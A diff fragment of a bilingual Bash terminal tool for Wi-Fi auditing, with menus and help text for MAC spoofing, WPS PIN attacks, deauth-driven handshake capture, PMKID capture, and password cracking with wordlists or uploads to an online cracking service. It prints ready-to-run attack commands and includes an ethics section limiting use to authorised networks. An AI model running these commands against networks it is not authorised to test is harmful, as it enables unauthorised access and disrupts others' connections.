+                           RUN_LOG="$BULLY_DIR/bully_${tag}_${st}.log"
+                           run_cmd "$B -b $b -c $ch -F -B $MON"
+                       else echo -e "${RED}$(t err_bully)${NC}"; sleep 2; fi ;;
+                    4) local tag st base; tag=$(sanitize_tag "$essid" "$b"); st=$(stamp_now)
+                       base="$HS_DIR/handshake_${tag}_${st}"
+                       run_cmd "airodump-ng -c $ch --bssid $b -w $base $MON"
+                       fix_owner "$HS_DIR" "$base"* 2>/dev/null
+                       check_handshake_result "$base"; press_any ;;
+                    5) pmkid_pipeline "$b" "$ch" "$essid" ;;
+                    6) db_upsert "$essid" "$b" "$ch" "" ""
+                       echo -e "\n${GREEN}$(t h_saved)${NC}"; sleep 1 ;;
+                    7) return ;;
+                esac ;;
+        esac
+    done
+}
+
+menu_scan() {
+    require_mon || return
+    SELECTED_IDX=0
+    while true; do
+        local options=(
+            "${YELLOW}|$(t s1)"
+            "${YELLOW}|$(t s2)"
+            "${RED}|$(t back)"
+        )
+        draw_menu "$(t scan_t)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                [ "$num" -eq 3 ] && return
+                case "$num" in
+                    1) scan_run_live
+                       scan_static_table ;;
+                    2) run_cmd "airodump-ng $MON"
+                       prompt_input "$(t pr_bssid)" TARGET_BSSID || continue
+                       prompt_input "$(t pr_chan)" TARGET_CHANNEL || continue ;;
+                esac ;;
+        esac
+    done
+}
+
+
+# ── Смена MAC ─────────────────────────────────────────────────────────
+menu_mac() {
+    SELECTED_IDX=0
+    while true; do
+        find_mon_iface >/dev/null 2>&1
+        local cur_mac="-"
+        [ -n "$MON" ] && cur_mac=$(cat /sys/class/net/$MON/address 2>/dev/null)
+        
+        local options=(
+            "${CYAN}|$(L "Текущий MAC" "Current MAC") ($MON): $cur_mac"
+            "${GREEN}|$(L "Случайный MAC (для $MON)" "Random MAC (for $MON)")"
+            "${YELLOW}|$(L "Ввести свой MAC" "Enter custom MAC")"
+            "${RED}|$(L Назад Back)"
+        )
+        draw_menu "$(L "Смена MAC-адреса" "MAC address change")" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) return ;;
+            enter|num:*)
+                case "$num" in
+                    1) : ;; # Просто инфо
+                    2)
+                        if [ -z "$MON" ]; then echo -e "${RED}$(L "Сначала подними монитор!" "Enable monitor first!")${NC}"; sleep 2; continue; fi
+                        # Генерация случайного локального MAC
+                        local rmac=$(printf '02:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
+                        info "$(L "Меняю $MON на $rmac..." "Changing $MON to $rmac...")"
+                        ip link set $MON down
+                        ip link set $MON address $rmac
+                        ip link set $MON up
+                        info "$(L "Готово. Новый MAC:" "Done. New MAC:") $(cat /sys/class/net/$MON/address)"
+                        sleep 2 ;;
+                    3)
+                        if [ -z "$MON" ]; then echo -e "${RED}$(L "Сначала подними монитор!" "Enable monitor first!")${NC}"; sleep 2; continue; fi
+                        prompt_input "$(L "Введи новый MAC (XX:XX:XX:XX:XX:XX):" "Enter new MAC (XX:XX:XX:XX:XX:XX):")" new_mac || continue
+                        ip link set $MON down
+                        ip link set $MON address $new_mac
+                        ip link set $MON up
+                        info "$(L "Применено:" "Applied:") $new_mac"
+                        sleep 2 ;;
+                    4) return ;;
+                esac ;;
+        esac
+    done
+}
+
+clean_legacy_kit() {
+    local old
+    for old in aircrack-ng pixiewps reaver reaver-wps-fork-t6x bully; do
+        [ -d "$USER_HOME/wifi-tools/$old" ] && rm -rf "$USER_HOME/wifi-tools/$old"
+    done
+}
+
+sync_sources_to_kit() {
+    # Копируем свежие исходники из системы в папку пользователя (для оффлайн-бэкапа)
+    local kit_src="$USER_HOME/wifi-tools/src"
+    if [ -d "/opt/wifi-tools/src" ]; then
+        info "$(L "Синхронизирую исходники в $kit_src ..." "Syncing sources to $kit_src ...")"
+        mkdir -p "$kit_src"
+        clean_legacy_kit
+        for n in aircrack-ng pixiewps reaver bully; do
+            if [ -d "/opt/wifi-tools/src/$n" ]; then
+                rm -rf "$kit_src/$n"
+                # Копируем и сразу ставим текущее время (touch), чтобы свойства показывали "сейчас"
+                cp -r "/opt/wifi-tools/src/$n" "$kit_src/$n"
+                find "$kit_src/$n" -exec touch {} +
+            fi
+        done
+        info "$(L "Исходники в папке обновлены." "Sources in folder updated.")"
+    fi
+}
+
+# ══════════════════════════════════════════════════════════════════════
+# СПРАВКА — навигация по разделам, описание + готовые команды, поиск.
+# Каждый раздел = функция help_sec_X, печатает двуязычный текст.
+# ══════════════════════════════════════════════════════════════════════
+
+# helper: заголовок раздела
+_hh(){ echo -e "${CYAN}${BOLD}$1${NC}\n${WHITE}────────────────────────────────────${NC}"; }
+# helper: подпункт "что делает" / абзац
+_hp(){ echo -e "$1\n"; }
+# helper: строка-команда (подсвечена, для ручного ввода)
+_hc(){ echo -e "  ${GREEN}\$ $1${NC}"; }
+# helper: предупреждение
+_hw(){ echo -e "${YELLOW}⚠ $1${NC}"; }
+
+help_sec_intro(){
+    _hh "$(L "О программе" "About")"
+    _hp "$(L "wh — TUI для аудита Wi-Fi сетей. Объединяет сканирование, WPS-атаки (Pixie-Dust, Reaver, Bully), захват PMKID и полного handshake, локальную и онлайн-проверку паролей." "wh — a TUI for Wi-Fi network auditing. Combines scanning, WPS attacks (Pixie-Dust, Reaver, Bully), PMKID and full handshake capture, local and online password checking.")"
+    _hp "$(L "Навигация: стрелки ↑↓ — выбор, Enter — открыть, Esc — назад. Захват останавливается ЛЮБОЙ клавишей. Ctrl+C не выкидывает из программы." "Navigation: arrows ↑↓ to select, Enter to open, Esc to go back. Capture stops with ANY key. Ctrl+C does not exit the program.")"
+
+    _hh "$(L "Где работает (только Linux)" "Where it runs (Linux only)")"
+    _hp "$(L "Установщик поддерживает 4 семейства систем — под них подходят десятки дистрибутивов:" "The installer supports 4 system families — dozens of distros fall under them:")"
+    _hp "$(L "• Debian/Ubuntu (apt): Debian, Ubuntu, Kali Linux, Parrot OS, Linux Mint, Pop!_OS, Raspberry Pi OS, Elementary, Zorin, Deepin, MX Linux, Devuan, Kubuntu/Xubuntu/Lubuntu." "• Debian/Ubuntu (apt): Debian, Ubuntu, Kali Linux, Parrot OS, Linux Mint, Pop!_OS, Raspberry Pi OS, Elementary, Zorin, Deepin, MX Linux, Devuan, Kubuntu/Xubuntu/Lubuntu.")"
+    _hp "$(L "• Fedora/RHEL (dnf): Fedora, RHEL, CentOS Stream, Rocky Linux, AlmaLinux, Nobara, Qubes (dom0 не в счёт)." "• Fedora/RHEL (dnf): Fedora, RHEL, CentOS Stream, Rocky Linux, AlmaLinux, Nobara, Qubes (excluding dom0).")"
+    _hp "$(L "• Arch (pacman): Arch Linux, Manjaro, EndeavourOS, Garuda, ArcoLinux, Artix, BlackArch." "• Arch (pacman): Arch Linux, Manjaro, EndeavourOS, Garuda, ArcoLinux, Artix, BlackArch.")"
+    _hp "$(L "• ALT Linux (apt+RPM): все редакции ALT (Workstation, Simply, Education, Sisyphus)." "• ALT Linux (apt+RPM): all ALT editions (Workstation, Simply, Education, Sisyphus).")"
+    _hp "$(L "Лучше всего — Kali, Parrot, BlackArch (инструменты уже предустановлены) и ALT (проверенная база проекта)." "Best on Kali, Parrot, BlackArch (tools preinstalled) and ALT (the project's tested base).")"
+
+    _hh "$(L "Где НЕ работает" "Where it does NOT run")"
+    _hp "$(L "• macOS — НЕТ. Дело не в терминале (он есть), а в ядре: у macOS закрытые Wi-Fi драйверы без нормального monitor mode и пакетной инъекции, которые нужны hcxdumptool/reaver/aircrack-ng. Это Linux-технологии (mac80211/nl80211)." "• macOS — NO. It's not about the terminal (there is one), it's the kernel: macOS has closed Wi-Fi drivers without proper monitor mode and packet injection that hcxdumptool/reaver/aircrack-ng need. These are Linux technologies (mac80211/nl80211).")"
+    _hp "$(L "• Windows — НЕТ (нативно). Те же причины. Можно поставить Linux в VirtualBox/VMware или dual-boot, но с USB-адаптером в проброс (Wi-Fi чип ноутбука через VM обычно недоступен)." "• Windows — NO (natively). Same reasons. You can run Linux in VirtualBox/VMware or dual-boot, but with a USB adapter passed through (the laptop's built-in Wi-Fi is usually unavailable via VM).")"
+    _hp "$(L "• WSL (Linux в Windows) — НЕТ. У WSL нет доступа к Wi-Fi адаптеру на уровне драйвера." "• WSL (Linux on Windows) — NO. WSL has no driver-level access to the Wi-Fi adapter.")"
+    _hw "$(L "Главное требование: Linux + Wi-Fi адаптер с поддержкой monitor mode и инъекции (напр. Atheros AR9271, чипы Ralink/MediaTek). Встроенные адаптеры Intel часто не умеют инъекцию." "Key requirement: Linux + a Wi-Fi adapter supporting monitor mode and injection (e.g. Atheros AR9271, Ralink/MediaTek chips). Built-in Intel adapters often can't inject.")"
+
+    _hw "$(L "Только для сетей, которыми владеешь или на аудит которых есть разрешение. См. раздел «Этика и ответственность»." "Only for networks you own or have permission to audit. See the 'Ethics and responsibility' section.")"
+}
+
+help_sec_wifistart(){
+    _hh "$(L "Подготовка интерфейса (монитор)" "Interface prep (monitor)")"
+    _hp "$(L "Переводит Wi-Fi адаптер в режим монитора — без него невозможны захват и атаки. Поднимает интерфейс вида wlan0mon/wlp*mon." "Puts the Wi-Fi adapter into monitor mode — capture and attacks are impossible without it. Brings up an interface like wlan0mon/wlp*mon.")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "sudo airmon-ng start wlan0"
+    _hc "sudo airmon-ng check kill   $(L "# убить мешающие процессы" "# kill interfering processes")"
+    _hp "$(L "Выключить монитор:" "Disable monitor:")"
+    _hc "sudo airmon-ng stop wlan0mon"
+    _hw "$(L "На ALT с AR9271 (ath9k_htc) монитор работает из коробки." "On ALT with AR9271 (ath9k_htc) monitor mode works out of the box.")"
+}
+
+help_sec_scan(){
+    _hh "$(L "Сканирование сетей" "Network scanning")"
+    _hp "$(L "Показывает сети вокруг: ESSID (имя), BSSID (MAC), канал, шифрование, уровень сигнала. Отсюда выбираешь цель для атак. Лог скана сохраняется в ~/wifi-unlock/." "Shows nearby networks: ESSID (name), BSSID (MAC), channel, encryption, signal. Pick your target here. Scan log is saved to ~/wifi-unlock/.")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "sudo airodump-ng wlan0mon"
+    _hc "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon"
+    _hp "$(L "WPS-сети (для Pixie/Reaver):" "WPS networks (for Pixie/Reaver):")"
+    _hc "sudo wash -i wlan0mon"
+}
+
+help_sec_wps(){
+    _hh "$(L "WPS-атаки: Pixie-Dust / Reaver / Bully" "WPS attacks: Pixie-Dust / Reaver / Bully")"
+    _hp "$(L "WPS — упрощённое подключение по 8-значному PIN. Уязвимо: PIN подбирается, а из него достаётся пароль Wi-Fi." "WPS is a simplified connection via an 8-digit PIN. Vulnerable: the PIN can be brute-forced, and the Wi-Fi password recovered from it.")"
+    _hp "$(L "• Pixie-Dust (reaver -K) — офлайн-атака, секунды-минуты, если роутер уязвим (слабый nonce)." "• Pixie-Dust (reaver -K) — offline attack, seconds-minutes if the router is vulnerable (weak nonce).")"
+    _hp "$(L "• Reaver — онлайн-перебор PIN, часы. • Bully — альтернатива Reaver, иногда стабильнее." "• Reaver — online PIN brute-force, hours. • Bully — a Reaver alternative, sometimes more stable.")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K -vv   $(L "# pixie" "# pixie")"
+    _hc "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv      $(L "# перебор PIN" "# PIN brute")"
+    _hc "bully -b AA:BB:CC:DD:EE:FF -c 6 -F -B wlan0mon"
+    _hw "$(L "Многие роутеры блокируют WPS после нескольких попыток (WPS locked) или он выключен. Тогда используй PMKID/Handshake." "Many routers lock WPS after a few attempts (WPS locked) or it's disabled. Then use PMKID/Handshake.")"
+}
+
+help_sec_handshake(){
+    _hh "$(L "Захват Handshake (рукопожатие)" "Handshake capture")"
+    _hp "$(L "4-way handshake (M1-M2-M3-M4) — обмен при подключении клиента к сети. Содержит данные для офлайн-подбора пароля. Нужен активный клиент на сети." "The 4-way handshake (M1-M2-M3-M4) is the exchange when a client connects. It contains data for offline password cracking. Requires an active client on the network.")"
+    _hp "$(L "Метод: deauth (выбить клиента) → он переподключается → ловим все 4 части. wh делает это через hcxdumptool." "Method: deauth (kick the client) → it reconnects → we capture all 4 parts. wh does this via hcxdumptool.")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hs wlan0mon"
+    _hc "sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon   $(L "# в другом окне" "# in another window")"
+    _hc "sudo hcxdumptool -i wlan0mon -o hs.pcapng --enable_status=31"
+    _hw "$(L "Нужен подключённый клиент. Нет клиента — нет handshake." "A connected client is required. No client — no handshake.")"
+}
+
+help_sec_pmkid(){
+    _hh "$(L "Захват PMKID" "PMKID capture")"
+    _hp "$(L "PMKID — идентификатор, который роутер отдаёт при первом контакте, ДАЖЕ без подключённых клиентов. Из него подбирается пароль. Проще handshake, но не все роутеры отдают." "PMKID is an identifier the router provides on first contact, EVEN without connected clients. The password is cracked from it. Simpler than a handshake, but not all routers provide it.")"
+    _hp "$(L "Два режима: «весь эфир» (ловит PMKID всех сетей вокруг) и «по выбранной сети» (только цель). Стоп — любой клавишей." "Two modes: 'whole air' (captures PMKID of all nearby networks) and 'selected network' (target only). Stop with any key.")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=31"
+    _hc "sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=AABBCCDDEEFF --filtermode=2"
+    _hp "$(L "Конвертация в хэш для взлома:" "Convert to a crackable hash:")"
+    _hc "hcxpcapngtool -o hash.22000 pmkid.pcapng"
+    _hw "$(L "M1M2ROGUE в потоке = PMKID от твоей приманки. Годится для заливки, но не всегда для локальной проверки." "M1M2ROGUE in the stream = PMKID from your rogue AP. Usable for upload, but not always for local check.")"
+}
+
+help_sec_hash(){
+    _hh "$(L "Работа с хэшем (локальная проверка)" "Work with hash (local check)")"
+    _hp "$(L "Проверяет пойманный хэш (.pcapng/.22000) по словарям — без интернета, без GPU. Два этапа: cracked.txt (быстрая база засвеченных паролей) → rockyou (~14 млн)." "Checks a captured hash (.pcapng/.22000) against wordlists — no internet, no GPU. Two stages: cracked.txt (quick base of exposed passwords) → rockyou (~14M).")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "aircrack-ng -w ~/wifi-unlock/cracked.txt hash.22000"
+    _hc "aircrack-ng -w ~/wifi-unlock/rockyou.txt hash.22000"
+    _hc "hashcat -m 22000 hash.22000 rockyou.txt   $(L "# на GPU, быстрее" "# on GPU, faster")"
+    _hw "$(L "Большой словарь на CPU — долго (часы). Есть GPU — используй hashcat." "A big wordlist on CPU is slow (hours). Got a GPU — use hashcat.")"
+}
+
+help_sec_online(){
+    _hh "$(L "Онлайн (wpa-sec.stanev.org)" "Online (wpa-sec.stanev.org)")"
+    _hp "$(L "Заливаешь .pcapng — волонтёры с фермами GPU подбирают пароль бесплатно. Нужен бесплатный ключ (Key) с сайта. Результат приходит со временем." "Upload a .pcapng — volunteers with GPU farms crack the password for free. Requires a free Key from the site. Results arrive over time.")"
+    _hp "$(L "Ручные команды:" "Manual commands:")"
+    _hc "curl --cookie 'key=ТВОЙ_КЛЮЧ' -F 'file=@pmkid.pcapng' https://wpa-sec.stanev.org"
+    _hc "curl --cookie 'key=ТВОЙ_КЛЮЧ' https://wpa-sec.stanev.org/?api&dl=1   $(L "# взломанные" "# cracked")"
+    _hp "$(L "Свои сети и результаты:" "Your nets and results:")"
+    _hc "https://wpa-sec.stanev.org/?my_nets=&page=1"
+    _hw "$(L "Дубликаты сервер игнорирует. Файл нельзя обрезать/конвертировать — сломается handshake." "The server ignores duplicates. Don't trim/convert the file — it breaks the handshake.")"
+}
+
+help_sec_ethics(){
+    _hh "$(L "Этика и ответственность" "Ethics and responsibility")"
+    _hp "$(L "Все инструменты wh предназначены ТОЛЬКО для проверки собственных сетей или сетей, на аудит которых у тебя есть явное разрешение владельца." "All wh tools are intended ONLY for testing your own networks or networks you have explicit permission from the owner to audit.")"
+    _hp "$(L "Не используй это во вред окружающим. Доступ к чужим Wi-Fi без разрешения и глушение чужой связи (deauth) — противозаконны почти везде. Законы разных стран отличаются, но ответственность лежит на тебе — проверь правила своей страны." "Do not use this to harm others. Accessing others' Wi-Fi without permission and jamming others' connections (deauth) are illegal almost everywhere. Laws differ by country, but the responsibility is yours — check the rules where you live.")"
+    _hp "$(L "Практикуйся безопасно и легально: свои роутеры, учебные лаборатории (Hack The Box, TryHackMe), CTF-соревнования. Это лучший путь в кибербезопасность." "Practice safely and legally: your own routers, training labs (Hack The Box, TryHackMe), CTF competitions. That's the best path into cybersecurity.")"
+}
+
+# Список разделов справки: "функция|заголовок-ключ"
+menu_help() {
+    local hsel=0
+    # массив: имя_функции :: заголовок(RU) :: заголовок(EN) :: ключевые слова
+    local secs=(
+        "help_sec_intro"
+        "help_sec_wifistart"
+        "help_sec_scan"
+        "help_sec_wps"
+        "help_sec_handshake"
+        "help_sec_pmkid"
+        "help_sec_hash"
+        "help_sec_online"
+        "help_sec_ethics"
+    )
+    local titles_ru=("О программе" "Подготовка интерфейса" "Сканирование сетей" "WPS-атаки (Pixie/Reaver/Bully)" "Захват Handshake" "Захват PMKID" "Работа с хэшем (локально)" "Онлайн wpa-sec" "Этика и ответственность")
+    local titles_en=("About" "Interface prep" "Network scanning" "WPS attacks (Pixie/Reaver/Bully)" "Handshake capture" "PMKID capture" "Work with hash (local)" "Online wpa-sec" "Ethics and responsibility")
+    while true; do
+        clear
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e "${CYAN}${BOLD}      $(t help_t)      ${NC}"
+        echo -e "${CYAN}${BOLD}========================================${NC}"
+        echo -e "${WHITE}$(t help_hint)${NC}\n"
+        local i total=${#secs[@]}
+        for i in "${!secs[@]}"; do
+            local ttl; [ "$LANG_UI" = ru ] && ttl="${titles_ru[i]}" || ttl="${titles_en[i]}"
+            if [ "$i" -eq "$hsel" ]; then echo -e "${BG_SEL} $((i+1)) ${ttl} ${NC}"
+            else echo -e "${CYAN} $((i+1)) ${ttl}${NC}"; fi
+        done
+        # пункт поиска и назад
+        local n_search=$((total+1)) n_back=$((total+2))
+        if [ "$hsel" -eq $((n_search-1)) ]; then echo -e "${BG_SEL} $n_search $(t help_search) ${NC}"
+        else echo -e "${YELLOW} $n_search $(t help_search)${NC}"; fi
+        if [ "$hsel" -eq $((n_back-1)) ]; then echo -e "${BG_SEL} $n_back $(t back) ${NC}"
+        else echo -e "${RED} $n_back $(t back)${NC}"; fi
+        echo -e "\n${CYAN}$(t hint)${NC}"
+        local key; key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((hsel+1))
+        case "$key" in
+            up)   ((hsel>0)) && ((hsel--)) ;;
+            down) ((hsel<n_back-1)) && ((hsel++)) ;;
+            esc)  return ;;
+            enter|num:*)
+                [ "$num" -ge 1 ] && [ "$num" -le "$n_back" ] || continue
+                if [ "$num" -eq "$n_back" ]; then return
+                elif [ "$num" -eq "$n_search" ]; then
+                    help_search_run "${secs[@]}"
+                else
+                    clear; "${secs[$((num-1))]}"; press_any
+                fi ;;
+        esac
+    done
+}
+
+# Поиск по всем разделам справки: спрашивает слово, показывает совпадающие разделы.
+help_search_run() {
+    local secs=("$@")
+    local q; clear
+    prompt_input "$(t help_search_q)" q || return
+    [ -z "$q" ] && return
+    clear
+    echo -e "${CYAN}${BOLD}$(t help_search_res) \"$q\"${NC}\n"
+    local found=0 s out
+    for s in "${secs[@]}"; do
+        out=$("$s" 2>/dev/null)
+        # ищем без учёта регистра
+        if printf '%s' "$out" | grep -qi -- "$q"; then
+            found=1
+            echo -e "${WHITE}════════════════════════════════════${NC}"
+            printf '%s' "$out" | grep -i --color=never -- "$q" | head -6
+            echo ""
+        fi
+    done
+    [ "$found" -eq 0 ] && echo -e "${YELLOW}$(t help_search_none)${NC}"
+    press_any
+}
+
+menu_main() {
+    SELECTED_IDX=0
+    while true; do
+        find_mon_iface >/dev/null 2>&1
+        local options=(
+            "${GREEN}|$(t m1)"
+            "${YELLOW}|$(t m2)"
+            "${CYAN}|$(t m7)"
+            "${MAGENTA}|$(t m3)"
+            "${BLUE}|$(t m4)"
+            "${CYAN}|$(t m5)"
+            "${GREEN}|$(t help_t)"
+            "${WHITE}|$(t settings_t)"
+            "${YELLOW}|$(t m9)"
+            "${RED}|$(t m_exit)"
+        )
+        draw_menu "$(t title_main)" "${options[@]}"
+        local key=$(read_key); local num="${key#num:}"
+        [ "$key" = "enter" ] && num=$((SELECTED_IDX+1))
+        case "$key" in
+            up) ((SELECTED_IDX>0)) && ((SELECTED_IDX--)) ;;
+            down) ((SELECTED_IDX<${#options[@]}-1)) && ((SELECTED_IDX++)) ;;
+            none) ;;
+            esc) clear; exit 0 ;;
+            enter|num:*)
+                case "$num" in
+                    1) wifistart_main ;;
+                    2) with_saved_idx menu_scan ;;
+                    3) with_saved_idx menu_history ;;
+                    4) with_saved_idx menu_wps ;;
+                    5) with_saved_idx menu_wpa ;;
+                    6) echo -e "\n${CYAN}$(t pr_cmd)${NC}"
+                       local cmd="" char
+                       while IFS= read -rsn1 char; do
+                           if [[ $char == $'\e' ]]; then local rest; read -rsn2 -t 0.1 rest; [ -z "$rest" ] && break
+                           elif [[ $char == "" ]]; then break
+                           elif [[ $char == $'\x7f' || $char == $'\x08' ]]; then cmd="${cmd%?}"; echo -ne "\b \b"
+                           else cmd+="$char"; echo -n "$char"; fi
+                       done
+                       echo; [ -n "$cmd" ] && run_cmd "$cmd" ;;
+                    7) with_saved_idx menu_help ;;
+                    8) with_saved_idx menu_settings ;;
+                    9) wifistop_main ;;
+                    10) clear; exit 0 ;;
+                esac ;;
+        esac
+    done
+}
+
+# ── диспетчер: один файл, разные команды ──────────────────────────────
+case "$(basename "$0")" in
+    installwh)   inst_main "$@" ;;
+    uninstallwh) uninst_main ;;
+    wifistart)   wifistart_main "$@" ;;
+    wifistop)    wifistop_main ;;
+    *)           clear; echo -e "${GREEN}${BOLD}$(t msg_init)${NC}"; sleep 0.5; menu_main ;;
+esac
